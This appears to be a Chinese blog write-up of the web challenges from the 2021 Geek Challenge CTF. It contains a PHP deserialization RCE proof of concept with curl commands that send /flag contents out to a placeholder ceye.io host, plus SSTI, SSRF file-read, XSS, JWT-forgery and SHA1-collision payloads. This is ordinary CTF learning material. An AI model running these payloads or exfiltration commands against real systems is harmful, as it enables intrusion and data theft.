---
title: 2021极客大挑战-web
id: 2021极客大挑战-web
date: 2021-11-16 10:59:30

---

<!-- more -->

只做了这点=-=，但也学到很多



![](https://i.loli.net/2021/11/13/vp1omrnOYMfCIFt.png)

## Dark

dark网，用tor访问即得flag



## Welcome2021

先换成WELCOM方式进行请求，提示下一关在f1111aaaggg9.php，访问之

![](https://i.loli.net/2021/10/21/Chtw4DQJmgjMUbR.png)

## babysql

![](https://i.loli.net/2021/10/21/kMthnI18Zp5jbUy.png)

## babypop

```php
<?php
class a {
    public static $Do_u_like_JiaRan = false;
    public static $Do_u_like_AFKL = false;
}

class b {
    private $i_want_2_listen_2_MaoZhongDu;
    public function __toString()
    {
        if (a::$Do_u_like_AFKL) {
            return exec($this->i_want_2_listen_2_MaoZhongDu);
        } else {
            throw new Error("Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!");
        }
    }
}

class c {
    public function __wakeup()
    {
        a::$Do_u_like_JiaRan = true;
    }
}

class d {
    public function __invoke()
    {
        a::$Do_u_like_AFKL = true;
        return "关注嘉然," . $this->value;
    }
}

class e {
    public function __destruct()
    {
        if (a::$Do_u_like_JiaRan) {
            ($this->afkl)();
        } else {
            throw new Error("Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!");
        }
    }
}

if (isset($_GET['data'])) {
    unserialize(base64_decode($_GET['data']));
} else {
    highlight_file(__FILE__);
}
```

a类的两个属性为静态属性，无法直接赋值改啦，看代码可以构造pop链

`c->__wakeup()`（`a::$Do_u_like_JiaRan = true;`；在随便定义个不存在的属性赋为e的实例化(new e();)）

——》`e->__destruct()`（`($this->afkl)()`触发invoke）

——》`d->__invoke()`（`a::$Do_u_like_AFKL = true;`；`return "关注嘉然," . $this->value;`触发toString）

——》`b->__toString()`（`exec($this->i_want_2_listen_2_MaoZhongDu);`exec无回显rce）

poc：

```php
<?php

class b {
    private $i_want_2_listen_2_MaoZhongDu='curl `ls / | sed -n "5p"`.xxx.ceye.io';
    # private $i_want_2_listen_2_MaoZhongDu='curl http://xxx.ceye.io/`cat /flag | base64`';
}

class c {
    public $fake;
    public function __construct(){
        $this->fake=new e();
    }
}

class d {
    public $value;
    public function __construct(){
        $this->value = new b();
    }
}

class e {
    public $afkl;
    public function __construct(){
        $this->afkl = new d();
    }
}

$a = new c();
echo base64_encode(serialize($a));
```

这里用rce卡很久，反弹shell弹不出来，选择用dns外带了：
[CEYE - Monitor service for security testing](http://ceye.io/) 或者 [DNSLog Platform](http://www.dnslog.cn/)

但是外带的时候又碰到一些问题，学习了这篇文章：[RCE篇之无回显rce - 学安全的小白 - 博客园 (cnblogs.com)](https://www.cnblogs.com/pursue-security/p/15406672.html)

像ls，因为返回的结果是多行的，这里就只能显示一行，可以像这样：

```sh
curl `ls / | sed -n "5p"`.xxx.ceye.io
```

![](https://i.loli.net/2021/10/29/gSBo1fmieasyqnC.png)

确认flag在根目录下，在cat的时候出了些问题，可能因为一些字符问题，导致flag显示不全，这里用base64编码后再带出来：

```sh
curl http://xxx.ceye.io/`cat /flag | base64`
```

![](https://i.loli.net/2021/10/29/ZFHvIbUjs4TLa26.png)

![](https://i.loli.net/2021/10/29/tZYJwQdkGNq4WjA.png)



## where_is_my_FUMO

[Linux反弹shell（一）文件描述符与重定向 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2548)

[Linux 反弹shell（二）反弹shell的本质 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2549)

```php
<?php
function chijou_kega_no_junnka($str) {
    $black_list = [">", ";", "|", "{", "}", "/", " "];
    return str_replace($black_list, "", $str);
}

if (isset($_GET['DATA'])) {
    $data = $_GET['DATA'];
    $addr = chijou_kega_no_junnka($data['ADDR']);
    $port = chijou_kega_no_junnka($data['PORT']);
    exec("bash -c \"bash -i < /dev/tcp/$addr/$port\"");
} else {
    highlight_file(__FILE__);
}
```

看源码，和一般的反弹shell不同，它实际是将咱们的vps这边作为输入，可以理解为无回显rce
但是咱们可以再监听一个端口用来接收命令执行后的结果，如下

找到了根目录下的flag.png

![](https://i.loli.net/2021/10/31/IUKqLwHOEThJn6m.png)

再把文件内容传过来就行

![](https://i.loli.net/2021/10/31/LEU58H9CvOmfTkn.png)

可以在linux上用eog命令来读，也可以用vps传回本机看

![](https://i.loli.net/2021/10/31/n4ZBAsLYWwDjF8J.png)

## babyphp

读robots.txt

```
User-agent: *
Disallow: /noobcurl.php
```

访问之，考的是ssrf，并且提示了flag在根目录

```php
<?php
function ssrf_me($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        curl_close($ch);
        echo $output;
}

if(isset($_GET['url'])){
    ssrf_me($_GET['url']);
}
else{
    highlight_file(__FILE__);
        echo "<!-- 有没有一种可能，flag在根目录 -->";
}
```

用file://协议读就行

```
http://47.100.242.70:4659/noobcurl.php?url=file:///flag
```

![](https://s2.loli.net/2022/03/09/egBnf56JXqhRt9v.png)





## babypy

ssti模版注入
调的是`os._wrap_close`

```
{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('cat /flag').read()}}
```

![](https://i.loli.net/2021/10/27/ovTj1WBY29bxKfJ.png)

## 蜜雪冰城甜蜜蜜

> 听说点出绝绝子的第九号饮料就可以获得flag捏

随便点击一下，会提示点的是几号饮品

![](https://i.loli.net/2021/10/27/tsrWD3gPy5EwpGH.png)

把id改成9再点就出了

![](https://i.loli.net/2021/10/27/xyMHnuDG1tpqK6z.png)



## 雷克雅未克

![](https://s2.loli.net/2022/03/09/hIjEvSp386sx924.png)

![](https://i.loli.net/2021/10/27/JzmuQT2ofP1LO5I.png)

jsfuck，丢控制台：
![](https://i.loli.net/2021/10/27/vps5PVqycTJ37uL.png)







## 人民艺术家

随便输入登录一下，会给出账号密码

![](https://i.loli.net/2021/11/08/i8l2bkjH5am1f7r.png)

登录抓包

![](https://i.loli.net/2021/11/08/dQPcnDl1XUNFhkE.png)



c-jwt-cracker爆破下key：`1234`

![](https://i.loli.net/2021/11/08/Pzwc1TVyxsZXFfJ.png)

然后根据提示：[JSON Web Tokens - jwt.io](https://jwt.io/) 修改为2019年的admin

![](https://i.loli.net/2021/11/08/flgtqaDPuz5NWIU.png)



抓返回包或者当头部传进去都可以，得到flag所在文件
`fffffffffffffffffffffffffffffffflaggggu9821347981.php`

![](https://s2.loli.net/2022/03/09/Qx6MrRlWbXqTIOe.png)

访问之

![](https://i.loli.net/2021/11/08/tTzLCacEPspSq5Z.png)







## babyxss

如题，成功输入alert(1)即可，构造闭合：

```
'"</script><script>alalertert(1);</script>
```

![](https://i.loli.net/2021/10/21/RjXwKyvJWHLbFZk.png)



## Baby_PHP_Black_Magic_Enlightenment

```php
<?php
echo "PHP is the best Language <br/>";
echo "Have you ever heard about PHP Black Magic<br/>";
error_reporting(0);
$temp = $_GET['password'];
is_numeric($temp)?die("no way"):NULL;    
if($temp>9999){
    echo file_get_contents('./2.php');
    echo "How's that possible";
} 
highlight_file(__FILE__);
//Art is long, but life is short. So I use PHP.
//I think It`s So useful that DiaoRen Said;
//why not they use their vps !!!
//BBTZ le jiarenmen

?>
```

绕过is_numeric()，%0a啥的就行

```
?password=99999%0a
```

提示下一关在baby_magic.php

![](https://i.loli.net/2021/10/27/oQta8gseMlhbVEB.png)

```php
<?php
error_reporting(0);

$flag=getenv('flag');
if (isset($_GET['user']) and isset($_GET['pass'])) 
{
    if ($_GET['user'] == $_GET['pass'])
        echo 'no no no no way for you to do so.';
    else if (sha1($_GET['user']) === sha1($_GET['pass']))
      die('G1ve u the flag'.$flag);
    else
        echo 'not right';
}
else
    echo 'Just g1ve it a try.';
highlight_file(__FILE__);
?>
```

经典的强弱比较，数组绕

```
baby_magic.php?user[]=1&pass[]=2
```

![](https://i.loli.net/2021/10/27/el6iEZ2mVHQGobr.png)

访问之

```php
<?php
error_reporting(0);

$flag=getenv('fllag');
if (isset($_GET['user']) and isset($_GET['pass'])) 
{
    if ($_GET['user'] == $_GET['pass'])
        echo 'no no no no way for you to do so.';
    else if(is_array($_GET['user']) || is_array($_GET['pass']))
        die('There is no way you can sneak me, young man!');
    else if (sha1($_GET['user']) === sha1($_GET['pass'])){
      echo "Hanzo:It is impossible only the tribe of Shimada can controle the dragon<br/>";
      die('Genji:We will see again Hanzo'.$flag.'<br/>');
    }
    else
        echo 'Wrong!';
}else
    echo 'Just G1ve it a try.';
highlight_file(__FILE__);
?>
//刚才大意了 没有检测数组就让你执行了sha1函数 不讲武德 来偷袭 这下我修复了看你还能怎么办 🤡 //刚才大意了 没有检测数组就让你执行了sha1函数 不讲武德 来偷袭 这下我修复了看你还能怎么办 🤡
```

这题nm的有点眼熟啊，这不是那个师傅问我的题吗，原理参考：
[ctf/Prudentialv2_Cloud_50.md at master · bl4de/ctf (github.com)](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md)

直接上poc：

```python
import requests
import urllib.request

rotimi = urllib.request.urlopen("http://shattered.io/static/shattered-1.pdf").read()[:500];
letmein = urllib.request.urlopen("http://shattered.io/static/shattered-2.pdf").read()[:500];

r = requests.get('http://tc.rigelx.top:8003/baby_revenge.php', params={'name': rotimi, 'password': letmein});
print(r.text)
```

![](https://i.loli.net/2021/10/21/ZsAjVBFcOJb9H7w.png)

然后到here_s_the_flag.php

- 绕过第一个if：id传参不能等于Longlone;

- 然后url解码一次，再比较，为Longlone输出flag
  因为浏览器本身会url解码一次，传入2次url编码后的Longlone即可：

  ```
  http://tc.rigelx.top:8003/here_s_the_flag.php?id=%25%34%63%25%36%66%25%36%65%25%36%37%25%36%63%25%36%66%25%36%65%25%36%35
  ```

![](https://i.loli.net/2021/10/27/oVPSBD423mCRxH1.png)

